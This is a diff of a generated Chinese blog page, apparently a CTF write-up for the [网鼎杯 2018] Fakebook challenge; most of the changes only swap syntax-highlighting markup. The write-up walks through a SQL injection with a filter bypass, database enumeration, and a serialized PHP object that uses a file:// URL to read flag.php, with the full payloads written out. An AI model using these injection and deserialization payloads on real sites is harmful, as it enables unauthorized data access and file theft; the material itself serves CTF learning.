@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      721 字
+      704 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      21
+      20
        分钟
     </span>
   
@@ -240,66 +248,66 @@
             <div class="markdown-body">
               <h2 id="二十二、"><a href="#二十二、" class="headerlink" title="二十二、"></a>二十二、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[网鼎杯 2018]Fakebook<br><img src="https://ftp.bmp.ovh/imgs/2021/02/60fda5da538b4fed.png" srcset="/img/loading.gif"></p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>转了一圈没发现什么信息，先join注册一个看看吧<br>注册后发现自己的用户名可以点<br>点进去<img src="https://ftp.bmp.ovh/imgs/2021/02/e439ef5ab0af2a57.png" srcset="/img/loading.gif"><br>url中有<code>?no=1</code>加上个单引号—–报错<br>可以注入<code>?no=2/2</code>返回原来的界面—判断是数字型注入<br>经测试，union和select连在一起被过滤，可以<code>union/**/select</code>绕过<br><code>?no=2 union/**/select 1,2,3,4%23</code>看回显位<br><img src="https://ftp.bmp.ovh/imgs/2021/02/83843e2428edd86c.png" srcset="/img/loading.gif"><br>可以看到是<code>2</code>位，接下来在<code>2</code>位上做文章<br><code>?no=2 union/**/select 1,(select database()),3,4%23</code>看库名——-<code>fakebook</code><br><code>?no=2 union/**/select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;fakebook&#39;),3,4%23</code>表名——<code>users</code><br><code>?no=2 union/**/select 1,(select group_concat(column_name)from information_schema。columss where table_name=&#39;users&#39;),3,4%23</code>列名 <img src="https://ftp.bmp.ovh/imgs/2021/02/ba2c9bb3cf8aa2b0.png" srcset="/img/loading.gif"><br>有个data<img src="https://ftp.bmp.ovh/imgs/2021/02/e5ac564e3185f08b.png" srcset="/img/loading.gif"><br>是一串序列化后的字节流<br>在robots.txt中发现<code>/user.php.bak</code>,得到一个文件，是源码</p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;&quot;</span>;
-    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;
-    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;&quot;</span>;
+<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
 
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">$this</span>-&gt;name = $name;
-        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;
-        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;
-    &#125;
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$url</span>)</span>
-<span class="hljs-function">    </span>&#123;
-		<span class="hljs-comment">//创建一个新的curl资源</span>
-        $ch = curl_init();
+    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+		<span class="token comment">//创建一个新的curl资源</span>
+        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 		
 		设置url和相应的选项
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);         <span class="hljs-comment">//如果CURLOPT_RETURNTRANSFER作为一个选项被设置到一个具体的句柄，那么这个函数将会以字符串的形式返回那个cURL句柄获取的内容。</span>
-        $output = curl_exec($ch);     <span class="hljs-comment">//抓取url并把它传递给浏览器</span>
-        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;
-            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
-        &#125;
-        curl_close($ch);       <span class="hljs-comment">//关闭curl资源，并且释放系统资源</span>
+        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//如果CURLOPT_RETURNTRANSFER作为一个选项被设置到一个具体的句柄，那么这个函数将会以字符串的形式返回那个cURL句柄获取的内容。</span>
+        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//抓取url并把它传递给浏览器</span>
+        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//关闭curl资源，并且释放系统资源</span>
 
-        <span class="hljs-keyword">return</span> $output;
-    &#125;
+        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
-    &#125;
+    <span class="token keyword">public</span> <span class="token keyword">function</span> getBlogContents <span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function">    </span>&#123;
-        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;
-        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);
-    &#125;
+    <span class="token keyword">public</span> <span class="token keyword">function</span> isValidBlog <span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-&#125;</code></pre></div></code></pre>
+<span class="token punctuation">&#125;</span>        </span></code></pre></code></pre>
 <p>大致意思就是get函数链接blog的url，将url返回的数据输出到页面上<br>curl是支持file协议的，而且sql注入的时候也得到了路径<br>本题还有个flag.php，wp说御剑能扫出来，但我扫不出来<br>data中是以序列化存储信息的，查询时要先反序列化，然后得到url<br>如果让它查询返回的包含<code>file:///var/www/html/flag.php</code>就可以得到flag<br>构造序列化字符串   </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;1&quot;</span>;
-    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;
-    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;
+<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"file:///var/www/html/flag.php"</span><span class="token punctuation">;</span>
 	
-&#125;
+<span class="token punctuation">&#125;</span>
 
-$a = <span class="hljs-keyword">new</span> UserInfo();
-<span class="hljs-keyword">echo</span> serialize($a);
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>        </code></pre></code></pre>
 <p><code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>          </p>
 <h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?no=2 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;%23</code><br>源码中得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/d8a4939109cd9d6b.png" srcset="/img/loading.gif"></p>
 <h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p>sql注入可以用报错注入      </p>
@@ -454,6 +462,8 @@ $a = <span class="hljs-keyword">new</span> UserInfo();
 
 
 
+  
+    
   
 
 
